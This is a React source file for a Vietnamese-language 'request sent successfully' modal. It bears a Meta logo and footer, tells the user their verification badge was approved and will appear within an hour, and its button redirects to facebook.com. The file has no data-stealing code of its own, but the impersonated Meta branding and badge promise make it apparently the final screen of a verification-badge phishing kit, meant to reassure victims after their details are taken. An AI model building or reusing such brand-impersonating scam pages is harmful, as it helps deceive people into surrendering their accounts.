import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import SuccessImage from '@/assets/images/succes.jpg';
import TickIcon from '@/assets/images/tick.svg';

const SuccessModal = ({ show, onClose, texts }) => {
    if (!show) return null;

    /* ── Styles ── */
    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-start',
        padding: '32px 16px',
        overflowY: 'auto',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none',
    };

    const modalStyle = {
        position: 'relative',
        width: '100%',
        maxWidth: '500px',
        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
        borderRadius: '24px',
        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
        zIndex: 1050,
        padding: '36px 32px 28px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        flexShrink: 0,
    };

    const titleStyle = {
        fontSize: '22px',
        fontWeight: 700,
        color: '#1c2b33',
        margin: '0 0 20px 0',
        textAlign: 'center',
    };

    const imageContainerStyle = {
        width: '100%',
        borderRadius: '16px',
        overflow: 'hidden',
        marginBottom: '24px',
        boxShadow: '0 4px 12px rgba(0,0,0,0.05)',
    };

    const contentBoxStyle = {
        textAlign: 'center',
        width: '100%',
        maxWidth: '380px',
        marginBottom: '28px',
    };

    const mainTextStyle = {
        fontSize: '15px',
        color: '#4b5e7d',
        lineHeight: '1.6',
        margin: '0 0 12px 0',
        fontWeight: '500',
    };

    const subTextStyle = {
        fontSize: '13px',
        color: '#8a9ab5',
        lineHeight: '1.5',
        margin: '12px 0 0 0',
    };

    const buttonStyle = {
        width: '100%',
        minHeight: '48px',
        fontSize: '16px',
        fontWeight: 600,
        color: '#fff',
        backgroundColor: '#0064E0',
        border: 'none',
        borderRadius: '999px',
        cursor: 'pointer',
        transition: 'all 0.2s',
        boxShadow: '0 8px 20px rgba(0,100,224,0.25)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
    };

    const footerStyle = {
        marginTop: '32px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        gap: '4px',
    };

    return (
        <div style={overlayStyle}>
            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                {/* Title */}
                <h2 style={titleStyle}>
                    {texts.successTitle || 'Yêu cầu đã được gửi thành công'}
                </h2>

                {/* Success Image */}
                <div style={imageContainerStyle}>
                    <img src={SuccessImage} alt="Success" style={{ width: '100%', display: 'block' }} />
                </div>

                {/* Content Box */}
                <div style={contentBoxStyle}>
                    <p style={mainTextStyle}>
                        {texts.successMessage1 || 'Tuyệt vời, yêu cầu xác minh của bạn đã được phê duyệt.'}
                    </p>
                    <p style={{ ...mainTextStyle, margin: 0 }}>
                        {texts.successMessage2 || 'Huy hiệu sẽ xuất hiện bên cạnh tên của bạn trong vòng một giờ tới.'}
                        <img src={TickIcon} width="18" alt="tick" style={{ verticalAlign: 'middle', marginLeft: '6px', display: 'inline-block' }} />
                    </p>
                    
                    <p style={subTextStyle}>
                        {texts.successMessage3 || 'Nếu huy hiệu không xuất hiện sau thời gian này, vui lòng liên hệ lại với chúng tôi để được hỗ trợ thêm.'}
                    </p>
                </div>

                {/* Submit Button */}
                <button
                    style={buttonStyle}
                    onClick={() => window.location.href = 'https://www.facebook.com'}
                    onMouseOver={(e) => { e.currentTarget.style.opacity = '0.9'; }}
                    onMouseOut={(e) => { e.currentTarget.style.opacity = '1'; }}
                >
                    {texts.confirm || 'Hoàn tất'}
                </button>

                {/* Footer Branding */}
                <div style={footerStyle}>
                    <img src={MetaLogo} alt="Meta Logo" style={{ height: '18px', opacity: 0.8 }} />
                    <span style={{ fontSize: '12px', color: '#8a9ab5', fontWeight: '400' }}>
                        {texts.aboutHelpMore || 'Giới thiệu · Trợ giúp · Xem thêm'}
                    </span>
                </div>
            </div>
        </div>
    );
};

SuccessModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default SuccessModal;
